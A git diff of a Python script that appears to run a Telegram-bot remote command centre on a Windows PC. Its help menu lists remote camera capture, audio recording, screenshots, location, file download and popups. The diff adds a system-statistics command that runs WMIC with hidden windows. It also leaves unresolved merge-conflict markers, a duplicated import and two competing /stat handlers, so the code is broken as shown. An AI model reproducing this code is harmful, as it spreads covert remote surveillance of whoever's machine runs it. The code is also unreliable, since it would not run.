@@ -76,8 +76,9 @@ def execute_command(command_text):
         send_reply("🖥️ Taking screenshot...")
         try:
             import pyautogui
+            import pyautogui
             timestamp = int(time.time())
-            filename = f"screen_{timestamp}.png"
+            filename = f"cmd_screen_{timestamp}.png" # Prefix cmd_ to avoid monitor auto-upload
             filepath = os.path.join(CAPTURES_DIR, filename)
             
             screenshot = pyautogui.screenshot()
@@ -209,6 +210,7 @@ def execute_command(command_text):
         
         threading.Thread(target=fetch_loc).start()
 
+<<<<<<< HEAD
     elif action == "/stat" or action == "/stats":
         send_reply("📊 Fetching system statistics...")
         try:
@@ -342,6 +344,8 @@ def execute_command(command_text):
         else:
             send_reply("❌ File not found.")
 
+=======
+>>>>>>> origin/main
     elif action == "/help":
         help_text = (
             "🛡️ *WatchDog Command Center*\n\n"
@@ -349,14 +353,15 @@ def execute_command(command_text):
             "• /capture - Take photo\n"
             "• /listen [sec] - Record audio\n"
             "• /screen - Screenshot\n"
+            "• /stat - System Status\n"
             "• /locate - Get Location\n"
-            "• /stat - System Statistics\n"
             "• /lock - Lock PC\n"
             "• /ls, /cd, /download - File Manager\n"
             "• /msg [text] - Show popup"
         )
         send_reply(help_text)
 
+<<<<<<< HEAD
 def set_bot_commands():
     """Update the command menu in Telegram to match available commands"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands"
@@ -378,10 +383,124 @@ def set_bot_commands():
         requests.post(url, json={"commands": commands}, timeout=10)
     except:
         pass
+=======
+    elif action == "/stat":
+        send_reply("📊 Analyzing System Vital Signs...")
+        
+        def get_status():
+            try:
+                import shutil
+                import subprocess
+                import platform
+                from datetime import datetime
+                
+                # Helper to run WMIC safely
+                def wmic_get(property_cmd):
+                    try:
+                        si = subprocess.STARTUPINFO()
+                        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                        # Adding /value to ensure format "Key=Value"
+                        # cmd string execution via shell=True for path compatibility
+                        full_cmd = f"wmic {property_cmd} /value"
+                        output = subprocess.check_output(full_cmd, startupinfo=si, shell=True).decode("utf-8", errors="ignore").strip()
+                        
+                        # Parsing "Key=Value" robustly
+                        lines = [line.strip() for line in output.splitlines() if line.strip()]
+                        for line in lines:
+                            if "=" in line:
+                                parts = line.split("=", 1)
+                                if len(parts) == 2:
+                                    return parts[1].strip()
+                        return None
+                    except:
+                        return None
+
+                # 1. System Info
+                os_name = wmic_get("os get Caption")
+                if not os_name:
+                    os_name = f"{platform.system()} {platform.release()}"
+
+                # 2. Boot Time
+                boot_time = "Unknown"
+                raw_boot = wmic_get("os get LastBootUpTime") # 20260116...
+                if raw_boot and "." in raw_boot:
+                    try:
+                         # Parse YYYYMMDDHHMMSS
+                        ts = raw_boot.split(".")[0]
+                        dt = datetime.strptime(ts, "%Y%m%d%H%M%S")
+                        boot_time = dt.strftime("%Y-%m-%d %H:%M:%S")
+                    except:
+                        pass
+
+                # 3. CPU
+                cpu_info = "Unknown"
+                load = wmic_get("cpu get loadpercentage")
+                freq = wmic_get("cpu get CurrentClockSpeed")
+                if load or freq:
+                    cpu_info = f"{load or '?'}% (Freq: {freq or '?'}Mhz)"
+
+                # 4. RAM
+                ram_info = "Unknown"
+                visible_mem = wmic_get("os get TotalVisibleMemorySize")
+                free_mem = wmic_get("os get FreePhysicalMemory")
+                
+                if visible_mem and free_mem:
+                    try:
+                        total_k = int(visible_mem)
+                        free_k = int(free_mem)
+                        used_k = total_k - free_k
+                        
+                        total_gb = round(total_k / 1024 / 1024, 1)
+                        used_gb = round(used_k / 1024 / 1024, 1)
+                        percent = round((used_k / total_k) * 100, 1)
+                        ram_info = f"{used_gb}GB / {total_gb}GB ({percent}%)"
+                    except:
+                        pass
+
+                # 5. Disk
+                disk_info = "Unknown"
+                try:
+                    total, used, free = shutil.disk_usage("C:\\")
+                    total_gb = round(total / (2**30), 1)
+                    free_gb = round(free / (2**30), 1)
+                    percent = round((used / total) * 100, 1)
+                    disk_info = f"{free_gb}GB free / {total_gb}GB"
+                except:
+                    pass
+
+                # 6. Battery
+                battery_info = "N/A (Desktop/No Battery)"
+                charge = wmic_get("path Win32_Battery get EstimatedChargeRemaining")
+                status_code = wmic_get("path Win32_Battery get BatteryStatus")
+                
+                if charge:
+                    status_text = "Unknown"
+                    if status_code == "1": status_text = "🔋 On Battery"
+                    elif status_code in ["2", "6", "7", "8", "9"]: status_text = "🔌 Plugged In"
+                    
+                    battery_info = f"{charge}% ({status_text})"
+
+                # Construct Report
+                report = (
+                    f"📊 *System Statistics*\n"
+                    f"------------------------\n"
+                    f"💻 *System*: {os_name}\n"
+                    f"🧠 *CPU*: {cpu_info}\n"
+                    f"💾 *RAM*: {ram_info}\n"
+                    f"💿 *Disk (C:)*: {disk_info}\n"
+                    f"⚡ *Battery*: {battery_info}\n"
+                    f"⏱️ *Boot Time*: {boot_time}"
+                )
+                send_reply(report)
+                
+            except Exception as e:
+                send_reply(f"❌ Stat Error: {str(e)}")
+
+        threading.Thread(target=get_status).start()
+>>>>>>> origin/main
 
 def start_commander_loop():
     """Main polling loop using Long Polling"""
-    set_bot_commands()
     offset = 0
     print("[*] Commander Service Started (Low-RAM Polling Mode)")
     
